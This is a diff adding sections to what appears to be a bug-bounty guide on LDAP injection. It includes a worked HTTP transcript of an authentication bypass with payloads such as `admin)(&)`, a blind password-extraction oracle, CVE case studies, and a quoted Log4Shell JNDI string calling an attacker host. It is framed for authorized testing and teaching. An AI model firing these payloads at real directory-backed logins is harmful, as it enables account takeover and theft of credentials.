@@ -387,6 +387,85 @@ NUL truncation (C-backed):
 **Why it works:** the app does an LDAP **search** with the filter, and if **≥1 entry matches**, it treats the login as successful (and often binds *as the returned DN* or just issues a session). By forcing a match without the real password, you authenticate.
 > **If this → then that:** `user=admin)(&)` (or `*)(uid=*))(|(uid=*`) **logs you in** → **authentication bypass**; if the account you land on is **admin/privileged → Critical ATO**, otherwise High. Confirm with a *benign* signal (you reach the post-login page / your own test-admin account) — **do not** rummage through a real user's data to "prove" it (§20). Note *which* account you land on (the first OU entry is frequently a service or admin account).
 
+## 9.1 The full attack, end-to-end — login → LDAP auth bypass → land as admin (worked transcript) ⭐
+
+> *This is the flagship worked example* — the LDAP-defining money move (log in with no password), on the wire. It also shows the **classify-before-you-fire** discipline that separates a real bug from a lucky guess, and the pivot to blind extraction when the sink is a search rather than a login. Own test instance / authorized target; one benign proof, then stop.
+
+**Target.** A corporate SSO portal at `sso.target.com` — "log in with your directory credentials." I assume the login filter is a concatenated `(&(uid=$user)(userPassword=$pass))` and set out to prove it.
+
+**Step 1 — baseline & classify (§4). Send each probe ALONE, compare to a normal login.** A normal wrong password gives a clean `Invalid credentials`:
+```http
+POST /login HTTP/1.1
+Host: sso.target.com
+Content-Type: application/x-www-form-urlencoded
+
+username=alice&password=wrongpass
+```
+```
+HTTP/1.1 200 OK
+{"error":"Invalid credentials"}
+```
+Now the classification probe — a lone `*` in the username (the LDAP match-any char):
+```http
+username=*&password=wrongpass
+```
+```
+HTTP/1.1 200 OK
+{"error":"Invalid credentials"}          # not an error/500 — the * was treated as data OR filtered; keep probing
+```
+And a metacharacter that would break a *concatenated* filter — a lone `)`:
+```http
+username=)&password=wrongpass
+```
+```
+HTTP/1.1 500 Internal Server Error       # ← the tell: an unbalanced ) corrupted the filter = raw concatenation, injectable
+```
+The `500` on a bare `)` is the classification win: my input lands **inside the filter unescaped**. A parametrised/escaped app would have treated `)` as a literal and returned `Invalid credentials`. Context: it's the classic **AND** login filter, so my job is to make the password clause always-true.
+
+**Step 2 — break out of the AND (§6).** I close the `uid` term and neutralise the `userPassword` clause. Two candidates by parser tolerance:
+```
+KNOWN user, kill the password:   username = admin)(&)          → (&(uid=admin)(&))(userPassword=wrongpass))
+UNKNOWN user, land on first:     username = *)(uid=*))(|(uid=*  → (&(uid=*)(uid=*))(|(uid=*)(userPassword=wrongpass))
+```
+
+**Step 3 — fire the known-user bypass.** I know `admin` exists (it's the canonical account name):
+```http
+POST /login HTTP/1.1
+Host: sso.target.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin)(%26)&password=wrongpass
+```
+(`%26` = `&`, URL-encoded so it survives the form body.)
+```
+HTTP/1.1 302 Found
+Location: /dashboard
+Set-Cookie: session=…; HttpOnly
+```
+**302 to `/dashboard` with a session cookie — not `Invalid credentials`.** The `(&)` (LDAP absolute-true) made the filter `(&(uid=admin)(&))` match the admin entry regardless of the password. I'm logged in **as admin with no password.**
+
+**Step 4 — confirm it's really admin, benignly (§20).** One read of *my own* landed session's identity, nothing else:
+```http
+GET /api/me HTTP/1.1
+Host: sso.target.com
+Cookie: session=…
+```
+```
+HTTP/1.1 200 OK
+{"uid":"admin","cn":"Administrator","memberOf":["CN=Domain Admins,OU=Groups,DC=target,DC=com"]}
+```
+`memberOf: Domain Admins` = I landed on a privileged account. **That is the finding** — authentication bypass to an administrative identity, CWE-90 + CWE-287, **Critical**. I do **not** start reading other users' records or changing anything to "prove impact further"; the admin `/api/me` is proof enough.
+
+**Step 5 — the pivot when the sink is a *search*, not a login (§8).** Had the injectable sink been the people-directory search instead of the login, the same `)`-corruption tell leads to **blind char-by-char extraction** rather than a session. Build a boolean oracle and walk an attribute:
+```
+(&(uid=admin)(userPassword=A*))   → "no results"  (false)
+(&(uid=admin)(userPassword=2*))   → "1 result"    (true)  → first char is '2'
+(&(uid=admin)(userPassword=2a*))  → iterate the next char …
+```
+`ldap_blind.py` automates this true/false oracle to dump an attribute (a hash, a token, a security-question answer) one character at a time — the disclosure/ATO path when there's no login to flip.
+
+**Why this is the LDAP-defining bug.** No shell, no password, no cracking — one metacharacter (`)`) proved the filter was concatenated, and one always-true clause (`(&)`) turned "uid=admin AND password=Y" into "uid=admin AND always," so the directory returned a match and the app equated "≥1 match" with "valid admin login." This exact class is still being disclosed in production a decade on (§15.3, CVE-2023-4501).
+
 ---
 
 # 10. Information Disclosure / Directory Enumeration
@@ -504,6 +583,18 @@ Map privileged groups:                   enumerate memberOf / (adminCount=1) →
 Once you can query directly (ldapsearch with a bind): windapsearch / ldapdomaindump / BloodHound for the full graph.
 ```
 > **If this → then that:** an LDAP-injectable AD front-end (login/search) → enumerate **non-preauth** (`userAccountControl & 0x400000`) and **SPN** accounts → **AS-REP roasting / Kerberoasting** offline (no further hits on the target) → crack → domain foothold. This is the bug-bounty→red-team bridge: the injection is the *entry*, AD enumeration is the *escalation*. (Bug bounty: a single enumerated privileged username is enough proof — don't run the offline cracking against a live engagement unless it's in scope.)
+
+## 15.3 Real-world LDAP-injection case studies (verified)
+
+> Re-verified against primary sources (linked in the references appendix) — the named events and canonical patterns behind the techniques above.
+
+- **CVE-2023-4501 — OpenText / Micro Focus Enterprise Server (2023): the textbook auth bypass, in a product that runs banks and governments.** The LDAP authentication in Enterprise Server (the enterprise COBOL dev/runtime, deployed across **financial services, insurance, and government**) could be bypassed via **LDAP injection**: authentication succeeded **with any valid username regardless of whether the password was correct**, and in some configurations even with an *invalid* username and any password. That is exactly the §9.1 mechanic — an always-true filter injection making the directory return a match without the real password — shipped in a mainstream identity-critical product a decade after the technique was public. Lesson: this class is not a lab curiosity; test every "log in with your directory credentials" portal.
+
+- **The wildcard auth-bypass is the canonical, recurring pattern.** Across OWASP WSTG, PortSwigger's Web Security Academy, and PayloadsAllTheThings, the same primitive recurs: the LDAP match-any character `*` combined with the logical operators (`&`, `|`, `!`) subverts filter logic. `username=*` with any password against `(&(uid=*)(userPassword=anything))` returns **all users** (first match = login); `admin)(&)` forces absolute-true. It is the single most-tested LDAP payload because it keeps working — developers who build filters by **string concatenation** instead of an RFC-4515 escaping API remain common. Memorise the AND-context breakout; it's the highest-yield probe.
+
+- **The class is still being disclosed in 2026.** LDAP-injection auth/filter-manipulation CVEs continue to land against modern software — e.g. a 2026 Dovecot advisory (CVE-2026-27860) allowing an attacker to inject an arbitrary LDAP filter (probing directory structure / bypassing username restrictions) when input-character validation is misconfigured. The takeaway for a tester: any component that forwards user input into an LDAP filter — mail servers, VPN/SSO appliances, printer/MFP portals, hand-rolled group checks — is in scope, not just the obvious web login.
+
+- **Why LDAP injection punches above its "no-shell" weight.** Unlike SQLi, LDAP injection rarely yields RCE — and it doesn't need to. It targets the **identity and authorization source of truth**: a successful injection logs you in as admin (auth bypass), dumps the whole org's PII and `memberOf` privilege graph (disclosure), or forges "you're in Domain Admins" (authorization bypass). On an Active Directory front-end it becomes the **entry point** for AS-REP roasting / Kerberoasting → domain foothold (§15.2). The severity comes from *what* the directory governs, which is everything.
 
 > **Distinguish from Log4Shell / JNDI injection:** `${jndi:ldap://attacker/x}` (CVE-2021-44228) makes a vulnerable **logging** library *fetch and deserialize* a remote object → **RCE**. That is *JNDI/deserialization*, **not** LDAP **filter** injection — different bug, different kit (it's an input-→-logger sink, test it on the same fields but report it separately). LDAP *filter* injection edits a directory query; it does not, by itself, give RCE.
 
